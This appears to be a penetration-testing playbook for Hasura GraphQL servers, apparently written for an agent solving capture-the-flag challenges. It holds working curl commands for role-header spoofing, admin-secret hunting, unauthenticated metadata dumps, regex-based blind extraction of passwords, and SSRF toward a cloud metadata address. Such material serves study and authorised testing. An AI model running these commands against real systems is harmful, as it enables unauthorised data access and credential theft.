# Hasura — the role-based authz model and its gaps

Hasura is Postgres-as-GraphQL: it introspects the DB, generates resolvers,
and enforces authz through **role-based permission rules** — declared per
table, per operation, per role. The bugs are permission misconfigurations,
header spoofing, and the admin-secret model. Deep enough to deserve its own
file.

---

## 1. Fingerprint

```text
/v1/graphql                       # the API path
/console                          # the admin console — free recon if open
x-hasura-* request headers        # role, user-id, admin-secret
errors[].extensions.path          # response shape
errors[].extensions.internal      # dev mode internals
```

```bash
curl -s "$BASE/v1/graphql" -H 'Content-Type: application/json' \
  -d '{"query":"{__typename}"}'
curl -sI "$BASE/console"                        # console exposed?
curl -sI "$BASE/v1/metadata"                    # metadata API exposed?
curl -sI "$BASE/v1/version"                     # version disclosure
```

## 2. The authz model

```text
x-hasura-admin-secret   →  full god-mode — console + all roles + metadata API
x-hasura-role           →  the role this request runs as
x-hasura-user-id        →  the authenticated user's id (for row filters)
x-hasura-allowed-uuids  →  extra session vars
```

The role comes from:

- A **JWT**: `x-hasura-role` claim inside `https://hasura.io/jwt/claims`.
- A **webhook**: the auth endpoint returns session vars.
- **The admin secret**: bypasses all of it.
- **The default role**: `HASURA_GRAPHQL_UNAUTHORIZED_ROLE` — usually
  `anonymous` — what unauthenticated requests get.

**The bug**: if the webhook/JWT is misconfigured, a client-supplied
`x-hasura-role` header is *trusted*:

```bash
curl -s "$BASE/v1/graphql" -H 'Content-Type: application/json' \
  -H 'x-hasura-role: admin' \
  -H 'x-hasura-user-id: 1' \
  -d '{"query":"{users{id email password}}"}'
```

If the server accepts the client-sent role without the secret — that is a
full authz bypass.

## 3. Admin-secret hunting

The secret is env-set — find it in:

- `.env` / `docker-compose.yml` / `deployment.yaml` leaks (`web-info-disclosure`).
- The **console page** at `/console` — the JS bundle often embeds it for
  admin sessions: `grep -r "admin-secret\|x-hasura" /tmp/console-js`.
- GraphQL itself — `query { settings }`, `query { config }`, remote schema
  fields that echo env.
- Metadata API `/v1/metadata` — `POST {"type":"export_metadata","args":{}}`
  sometimes open without auth.
- JWT-claims mode: a weak JWT signing key → forge the claims
  (`skills/web-auth-session/` + `session_dissect.py`).

## 4. Role-based schema filtering — the cosmetic illusion

Hasura filters the introspection *response* per role: `x-hasura-role:
anonymous` sees only anonymous-allowed types. **The filtered-out types still
resolve** if the permission is the only thing hiding them:

```bash
# introspect as anonymous
curl -s "$BASE/v1/graphql" -H 'x-hasura-role: anonymous' \
  -d '{"query":"{__schema{types{name}}}"}' > /tmp/anon-schema.json

# but probe hidden names directly — they may still resolve
curl -s "$BASE/v1/graphql" -H 'x-hasura-role: anonymous' \
  -d '{"query":"{secrets{value}}"}'
```

Compare role schemas — get the diff: `admin` vs `anonymous` vs `user` —
hidden types are the high-value targets for direct probing.

## 5. Permission-rule bypasses

Hasura permissions are declared as filters: `{user_id: {_eq: "X-Hasura-User-Id"}}`.
Weak declarations:

- `check: {}` — empty = allow all rows.
- `filter: {is_public: {_eq: true}}` — okay if the field is honest; bug if
  the caller can write `is_public:true` to a row they shouldn't see.
- `select` permission without `filter` + `aggregate` permission — aggregates
  leak counts of private rows.
- `allow_aggregations: true` on a private table — `users_aggregate{aggregate{count}}` 
  leaks even when `users` is filtered.
- **Backend only / `backend_only` mutations** — declared but still reachable
  through nested inserts on related tables.
- `column_presets` — set columns on insert: a preset of `user_id:
  X-Hasura-User-Id` should pin ownership; missing preset + client-set
  `user_id` = write-IDOR.

## 6. Generated field shapes — the auto-resolvers

```graphql
users(where:{...}, order_by:{...}, limit:Int, offset:Int): [users!]
users_by_pk(id:Int!): users
users_aggregate(where:{...}): users_aggregate
insert_users(objects:[users_insert_input!]!): users_mutation_response
update_users(where:{...}, _set:{...}): users_mutation_response
update_users_by_pk(pk_columns:{id:Int!}, _set:{...}): users_mutation_response
delete_users(where:{...}): users_mutation_response
```

Standard Postgres-style filters in `where`: `_eq`, `_neq`, `_gt`, `_lt`,
`_gte`, `_lte`, `_in`, `_nin`, `_like`, `_ilike`, `_similar`, `_regex`,
`_is_null`, `_and`, `_or`, `_not`, `_contains`, `_contained_in`, `_has_key`.

**The `where` arg is an operator-injection surface** — `_regex` on a
sensitive column gives boolean extraction; `_like`/`_ilike` gives wildcard
probes:

```graphql
{ users(where:{password:{_regex:"^flag"}}) {id} }    # blind-extract via _regex
{ users(where:{email:{_ilike:"%@internal.tld"}}) {id} }
```

## 7. Actions and remote schemas — SSRF surface

Hasura "Actions" proxy to HTTP webhooks; "Remote Schemas" proxy to other
GraphQL services. Both are server-side fetches:

```graphql
# an Action taking a URL arg — SSRF
mutation{ callWebhook(url:"http://169.254.169.254/..."){result} }

# remote schema fields reach internal services
{remoteInternalService{data}}
```

Also `headers` forwarding: `x-hasura-forward` or per-action header config —
a misconfigured action forwards *your* `x-hasura-admin-secret` to an
attacker URL it proxies.

## 8. The console and metadata API

`/console` is the admin UI — a **config dump**:

- `/console` without auth → schema browse + event triggers + secrets.
- `/v1/metadata` POST — `export_metadata` dumps the whole config including
  remote-schema URLs, webhook URLs, event triggers, and sometimes secrets.
- `/v1/query` legacy API — runs arbitrary `select`/`insert`/`update`/`delete`
  on tracked tables as the requesting role.
- `/v2/query` — typed query API.

```bash
curl -s "$BASE/v1/metadata" -H 'Content-Type: application/json' \
  -d '{"type":"export_metadata","args":{}}'
# if it returns the config — the console has no auth and the whole
# permission map + remote schemas + webhooks are readable
```

## 9. Event triggers — the side-channel

Hasura can fire webhooks on DB events. If you can `insert_users` on a table
with a trigger, the trigger's webhook call is an outbound fetch you cause —
a blind ping at minimum, sometimes a data-carrying SSRF.

## 10. Recording

```bash
python3 tools/state.py $CHAL --hypothesis \
  "Hasura role-spoof live — x-hasura-role:admin accepted without secret"
python3 tools/hooks.py post-probe $CHAL \
  --request 'POST /v1/graphql x-hasura-role:admin {users{email}}' \
  --verdict confirms --evidence-kind impact --class web-graphql \
  --hypothesis-id h8 --evidence '"email":"..."' --response '<verbatim>'
```
